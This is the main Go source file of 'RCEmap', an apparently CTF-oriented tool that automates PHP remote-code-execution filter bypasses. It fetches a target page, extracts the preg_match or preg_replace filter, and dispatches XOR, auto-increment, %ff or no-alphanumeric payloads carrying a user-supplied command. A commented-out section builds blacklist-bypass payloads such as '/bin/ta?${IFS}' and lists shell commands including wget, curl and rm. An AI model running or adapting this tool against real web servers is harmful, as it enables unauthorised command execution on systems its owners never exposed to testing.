package main

import (
	"RCEmap/script"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"regexp"
	"strings"
)

var i string
var command string
var v int
var m string
var char string
var cleanText string
var guolv string

const WARNING = "\x1b[31m [WARNING] \x1b[39m" //红色的WARNING
const inf = "\x1b[36m [INFO] \x1b[39m"        //蓝色的INFO

// 显示帮助内容

func displayHelp() {
	helpText := `
使用方法:
	go run rcemap.go 或者 ./rcemap.exe --help

选项:
	--help   显示帮助信息
	-u 目标url
	-i 参数点
	-c 需要执行的命令
	-v 输出当前php版本（默认为7）
	-m 设置请求方式为GET还是POST（默认为GET,请大写不然报错）
	...
	`

	fmt.Println(helpText)
}

// 使用 goquery 库的 Selection.Text() 方法获取去除了 HTML 标签的纯文本

// 设置目标和接收参数
func target() string {

	flag.StringVar(&i, "i", "", "参数点")
	flag.StringVar(&command, "c", "", "命令")
	flag.IntVar(&v, "v", 7, "参数点")
	flag.StringVar(&m, "m", "GET", "请求方式")
	url := flag.String("u", "", "target url")
	helpFlag := flag.Bool("help", false, "显示帮助信息")
	flag.Parse()
	if *helpFlag {
		displayHelp()
		os.Exit(0)
	}
	fmt.Println(inf + "URL: " + *url)
	return *url

}

// logo

func Logo() {
	Logo := `
	
██████╗  ██████╗███████╗███╗   ███╗ █████╗ ██████╗ 
██╔══██╗██╔════╝██╔════╝████╗ ████║██╔══██╗██╔══██╗
██████╔╝██║     █████╗  ██╔████╔██║███████║██████╔╝			
██╔══██╗██║     ██╔══╝  ██║╚██╔╝██║██╔══██║██╔═══╝ 			
██║  ██║╚██████╗███████╗██║ ╚═╝ ██║██║  ██║██║     
╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝      
	`

	fmt.Printf(Logo + "\n")
	fmt.Printf("\033[32m Author: Pr1nt \033[39m\n")
	fmt.Printf("\033[32m Version: v0.5 \033[39m\n")

}

func test(URL string) {
	var response *http.Response
	var err error

	if URL == "" {
		displayHelp()
		os.Exit(0)
	}

	response, err = http.Get(URL)
	if err != nil {
		fmt.Println("Error creating GET request:", err)

	}

	defer response.Body.Close()

	doc, err := io.ReadAll(response.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return
	}

	preg_match := "preg_match"
	preg_replace := "preg_replace"
	lines := strings.Split(string(doc), "\n")

	for _, line := range lines {
		cleanText = script.RemoveHTMLTags(line)
		if strings.Contains(cleanText, preg_match) {

			fmt.Printf(inf+"发现过滤: %s\n", preg_match)
			fmt.Printf(inf + "题目源码如下: \n" + cleanText + "\n")

			// 使用正则表达式提取括号内的内容
			re := regexp.MustCompile(`preg_match\("([^"]+)"`)
			matches := re.FindStringSubmatch(cleanText)

			if len(matches) > 1 {
				guolv = matches[1]
				fmt.Printf(inf+"发现过滤为: %s\n", guolv)
			} else {
				re = regexp.MustCompile(`preg_match\('([^']+)'`)
				matches = re.FindStringSubmatch(cleanText)
				if len(matches) > 1 {
					guolv = matches[1]
					fmt.Printf(inf+"发现过滤为: %s\n", guolv) // 输出过滤内容及括号内的匹配内容
				} //草泥马的就你一次匹配不好使呗，那老子两次匹配就完了呗

			}

			if strings.Contains(guolv, "a-z") && strings.Contains(guolv, "0-9") { //其他情况等待施工中

				//如果是无数字字母题目

				fmt.Println(inf + "经典无数字字母RCE题目")

				if strings.Contains(string(cleanText), "eval") {

					//eval环境下的无数字字母分好多种
					if strings.Contains(guolv, "$") {

						fmt.Println(inf + "执行eval函数")
						fmt.Println(inf + "普通无数字字母需要利用$，这里被过滤了，只能使用进阶版")
						//无数字字母进阶的eval两种版本施工完毕
						if !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, "~") && !strings.Contains(guolv, ";") {
							v = 7
							script.Noshuzievaljinjie(URL, command, v, i, m, guolv)
						} else if !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, "~") && !strings.Contains(guolv, "<") && !strings.Contains(guolv, "=") && !strings.Contains(guolv, ">") && !strings.Contains(guolv, "?") && !strings.Contains(guolv, "`") {
							v = 7
							script.Noshuzievaljinjie(URL, command, v, i, m, guolv)
						} else if !strings.Contains(guolv, ".") && !strings.Contains(guolv, "/") && !strings.Contains(guolv, "?") && !strings.Contains(guolv, "[") && !strings.Contains(guolv, "-") && !strings.Contains(guolv, "]") {
							v = 5
							script.Noshuzievaljinjie(URL, command, v, i, m, guolv)
						} else {
							fmt.Println(WARNING + "老弟你全给过滤了我咋做啊(其实要么是你菜要么是我菜不会做要么是这题无解)")
						}
					} else {

						fmt.Println(inf + "既然$没有被过滤，那么这里总共有三种方法")

						if !strings.Contains(guolv, "^") && !strings.Contains(guolv, "$") && !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, "'") && !strings.Contains(guolv, ".") && !strings.Contains(guolv, "_") && !strings.Contains(guolv, ";") && !strings.Contains(guolv, "[") && !strings.Contains(guolv, "]") {
							fmt.Println(inf + "可以使用异或")
							script.Xor(URL, command, v, i)
						} else if !strings.Contains(guolv, "$") && !strings.Contains(guolv, "_") && !strings.Contains(guolv, "+") && !strings.Contains(guolv, ";") && !strings.Contains(guolv, ".") {
							fmt.Println(inf + "可以使用自增")
							script.Zizeng(URL, command, i)

						} else if !strings.Contains(guolv, "$") && !strings.Contains(guolv, "{") && !strings.Contains(guolv, "}") && !strings.Contains(guolv, "^") && !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, ";") {
							fmt.Println(inf + "这是一种特殊的方法,利用%ff")
							script.Ff(URL, command, guolv, i)

						} else if !strings.Contains(guolv, "$") && !strings.Contains(guolv, "{") && !strings.Contains(guolv, "}") && !strings.Contains(guolv, "^") && !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, ">") && !strings.Contains(guolv, "<") && !strings.Contains(guolv, "?") && !strings.Contains(guolv, "=") && !strings.Contains(guolv, "`") {
							fmt.Println(inf + "当这个特殊方法中分号被过滤时只能使用短标签了")
							script.Ff(URL, command, guolv, i)
						}
					}

				} else if strings.Contains(string(cleanText), "system") {

					fmt.Println(inf + "执行system函数")
					script.Noshuzisystem(URL, command, guolv, i, m) //无数字字母的system不分版本施工完毕
					//啊不对，还差个环境变量

					if !script.Noshuzisystem(URL, command, guolv, i, m) {
						script.Pwd(URL, char)
					}
				} else {
					fmt.Println(WARNING + "这是什么题目QAQ")
					os.Exit(0) //看不懂题目，自动退出
				}

			} else {

				//不是无数字字母，一律是黑名单绕过

				//黑名单绕过这个知识点简单，但是脚本写起来复杂，整不明白了，代码注释后留在这，谁愿意二开添加上这个功能自己尝试吧

				//其实我能写成固定get方式发/bin/ta?${IFS}+command，然后让用户传c为flag的路径，检测flag如果被过滤就变成????,检测php如果被过滤变成???
				//如果这么写难度会骤减
				//或者写成只能传ls和tac，然后tac就上面处理方法，ls就检测没过滤直接扔，过滤就单引号绕一下

				/*
					//所有可用的函数
					heimingdan := []string{"cat", "tac", "nl", "more", "wget", "tail", "flag", "less", "head", "sed", "cut", "awk", "strings", "od", "curl", "scp", "rm", "0x20", ">", "`", "%", "x09", "x26", "<", "'", "\\", "\"", "${IFS}"}

					//将可利用函数与guolv掉的相匹配
					r := regexp.MustCompile(guolv)
					var guolv2 string

					for _, keyword := range heimingdan {
						if r.MatchString(keyword) {
							guolv2 += keyword
						} else {
							fmt.Println(inf + "可用的函数为: " + keyword)
							result += keyword
						}
					}

					var c1 string
					var c2 string
					leftIndex := strings.Index(command, "(")
					if leftIndex == -1 {
						// 字符串中没有左括号
						c1 = command
						c2 = ""
					}

					// 查找第一个右括号的索引
					rightIndex := strings.Index(command, ")")
					if rightIndex == -1 {
						// 字符串中没有右括号
						c1 = ""
						c2 = ""
					}

					if leftIndex < rightIndex {
						// 括号正确匹配，提取括号内外的内容
						//c1是括号外内容，c2是括号内内容
						c1 = command[:leftIndex]
						c2 = command[leftIndex+1 : rightIndex]

					} else {
						// 括号不正确匹配
						c1 = command
						c2 = ""
					}

					if strings.Contains(result, "'") {
						fmt.Println(inf + "单引号没被过滤，可以插函数里绕过")

						if strings.Contains(string(cleanText), "eval") {
							reURL := URL + "?" + i + "=" + c1 + "(" + c2 + ")"
							response, err = http.Get(reURL)
							fmt.Println(inf + "POC为: " + reURL)
							defer response.Body.Close()
							//上面这个eval没写，是占位的
						} else if strings.Contains(string(cleanText), "system") {
							var rec2 string
							var parts []string

							if strings.Contains(c2, " ") && strings.Contains(guolv2, "0x20") && strings.Contains(result, "${IFS}") {
								parts = strings.Split(c2, " ")
								if strings.Contains(guolv2, parts[0]) {
									c21 := parts[0][:len(parts[0])-1] // 通过切片操作删除最后一个字符
									c22 := strings.Replace(parts[0], c21, "", 1)
									rec2 = c21 + "''" + c22 + "${IFS}" + parts[1] //把两个单引号插入函数达到绕过

								}
							}//这里本来是想实现接受任一命令然后执行的

							reURL := URL + "?" + i + "=" + rec2
							response, err = http.Get(reURL)
							fmt.Println(inf + "POC为: " + reURL)
							defer response.Body.Close()
						}
					}

					body, err := io.ReadAll(response.Body)
					if err != nil {
						fmt.Println(err)
					}
					fmt.Println(inf + "回显为: " + removeHTMLTags(string(body)))
				*/
			}

		} else if strings.Contains(cleanText, preg_replace) {
			//replace过滤等待施工中
			fmt.Printf(inf+"发现过滤: %s\n", preg_replace)
			fmt.Printf(inf + "题目源码如下: \n" + cleanText + "\n")
			re := regexp.MustCompile(`preg_replace\("([^"]+)"`)
			matches := re.FindStringSubmatch(cleanText)

			if len(matches) > 1 {
				guolv = matches[1]
				fmt.Printf(inf+"发现过滤为: %s\n", guolv)
			} else {
				re = regexp.MustCompile(`preg_replace\('([^']+)'`)
				matches = re.FindStringSubmatch(cleanText)
				if len(matches) > 1 {
					guolv = matches[1]
					fmt.Printf(inf+"发现过滤为: %s\n", guolv)
				}

			}

		} else {
			//无源码fuzz出可用字符
			script.Fuzzpro(URL, i, m)
			os.Exit(0)
		}

	}

}

func main() {
	Logo()
	url := target()
	test(url)
}
